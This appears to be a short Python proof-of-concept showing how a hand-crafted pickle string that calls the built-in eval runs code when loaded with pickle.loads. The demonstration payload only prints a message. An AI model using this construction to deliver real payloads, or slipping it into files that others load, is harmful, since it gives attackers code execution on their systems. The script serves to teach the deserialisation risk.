import pickle
import pickletools
from functools import partial


hprint = partial(print, "\n#")


def main() -> None:

    hprint("Construct malicious payload")
    """
    c - GLOBAL
    p - PUT
    ( - MARK
    N - NONE
    t - TUPLE
    R - REDUCE
    V - UNICODE
    b - BUILD
    . - STOP
    """
    MALCODE = 'print("---> HEY THERE GANDALF !!!!")'
    MALICIOUS_PICKLE_STRING = f"c__builtin__\neval\n(V{MALCODE}\ntR."
    MALICIOUS_PICKLE_DATA = MALICIOUS_PICKLE_STRING.encode()
    pickletools.dis(MALICIOUS_PICKLE_DATA)

    hprint("Load malicious code")
    pickle.loads(MALICIOUS_PICKLE_DATA)


if __name__ == "__main__":
    main()
